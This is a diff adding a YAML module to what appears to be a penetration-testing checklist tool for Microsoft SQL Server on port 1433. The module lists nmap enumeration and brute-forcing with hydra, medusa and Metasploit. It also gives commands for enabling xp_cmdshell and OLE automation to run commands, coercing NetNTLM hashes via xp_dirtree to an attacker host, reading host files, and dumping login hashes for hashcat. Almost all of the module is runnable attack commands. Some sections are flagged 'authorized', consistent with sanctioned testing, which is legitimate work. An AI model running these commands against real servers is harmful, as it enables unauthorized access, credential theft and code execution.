@@ -1,0 +1,115 @@
+module: mssql
+name: MSSQL (1433)
+inputs: [USERS, PASS, DOMAIN, OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / version + default scripts
+        commands: |
+          nmap -p$PORT -sV -sC $IP
+          nmap -p$PORT --script=ms-sql-info $IP
+      - id: instance
+        text: Enumerate instances / named pipes (UDP browser 1434)
+        commands: |
+          nmap -sU -p1434 --script=ms-sql-info $IP
+          nmap -p$PORT --script=ms-sql-ntlm-info $IP
+      - id: ntlm_leak
+        text: Leak host/domain via NTLM handshake (unauth)
+        commands: |
+          nmap -p$PORT --script=ms-sql-ntlm-info --script-args=mssql.instance-port=$PORT $IP
+
+  - id: fingerprint
+    name: Fingerprinting & Enumeration
+    steps:
+      - id: connect
+        text: Connect (SQL auth / Windows auth)
+        commands: |
+          impacket-mssqlclient $DOMAIN/$USER:$PASS@$IP -port $PORT
+          impacket-mssqlclient $DOMAIN/$USER:$PASS@$IP -windows-auth
+          sqsh -S $IP:$PORT -U $USER -P $PASS
+      - id: dbs
+        text: Enumerate databases / tables / users
+        commands: |
+          # in mssqlclient:
+          # SELECT name FROM sys.databases;
+          # SELECT name FROM master..syslogins;
+          # SELECT * FROM <db>.INFORMATION_SCHEMA.TABLES;
+      - id: privs
+        text: Current role / impersonation candidates
+        manual: true
+        commands: |
+          # SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');
+          # SELECT distinct b.name FROM sys.server_permissions a
+          #   INNER JOIN sys.server_principals b ON a.grantor_principal_id=b.principal_id
+          #   WHERE a.permission_name='IMPERSONATE';
+      - id: linked
+        text: Discover linked servers (lateral SQL)
+        manual: true
+        commands: |
+          # SELECT srvname, isremote FROM sysservers;
+          # EXEC ('SELECT SYSTEM_USER') AT [LINKED\SERVER];
+
+  - id: vuln
+    name: Vulnerability Identification
+    steps:
+      - id: cve_map
+        text: Version to CVE mapping
+        commands: |
+          searchsploit microsoft sql server
+      - id: empty_sa
+        text: Check for blank/weak sa
+        commands: |
+          nmap -p$PORT --script=ms-sql-empty-password $IP
+
+  - id: creds
+    name: Default & Weak Credentials
+    authorized: true
+    steps:
+      - id: brute
+        text: Credential brute-force
+        commands: |
+          nmap -p$PORT --script=ms-sql-brute --script-args userdb=$USERLIST,passdb=$PASSLIST $IP
+          hydra -L $USERLIST -P $PASSLIST mssql://$IP -s $PORT
+          medusa -h $IP -U $USERLIST -P $PASSLIST -M mssql -n $PORT
+      - id: brute_msf
+        text: Brute-force via Metasploit
+        commands: |
+          msfconsole -qx "use auxiliary/scanner/mssql/mssql_login; set RHOSTS $IP; set RPORT $PORT; set USER_FILE $USERLIST; set PASS_FILE $PASSLIST; run; exit"
+
+  - id: exploit
+    name: Command Execution & Post-Access
+    authorized: true
+    steps:
+      - id: xp_cmdshell
+        text: Enable and use xp_cmdshell (RCE as service account)
+        commands: |
+          # EXEC sp_configure 'show advanced options',1; RECONFIGURE;
+          # EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
+          # EXEC xp_cmdshell 'whoami';
+          impacket-mssqlclient $DOMAIN/$USER:$PASS@$IP -port $PORT
+      - id: ole
+        text: Command exec via OLE automation (if xp_cmdshell blocked)
+        manual: true
+        commands: |
+          # sp_configure 'Ole Automation Procedures',1; RECONFIGURE;
+          # DECLARE @o INT; EXEC sp_oacreate 'wscript.shell',@o OUT;
+      - id: relay_hash
+        text: Coerce auth / steal NetNTLM (xp_dirtree to your host)
+        commands: |
+          # responder -I <iface>   then:
+          # EXEC master..xp_dirtree '\\<LHOST>\share';
+      - id: read_file
+        text: Read files from the host
+        manual: true
+        commands: |
+          # SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS x;
+      - id: hashdump
+        text: Dump SQL login hashes for cracking
+        manual: true
+        commands: |
+          # SELECT name, password_hash FROM sys.sql_logins;
+          # hashcat -m 1731 (mssql 2012+) / -m 132 (2005) hashes $PASSLIST
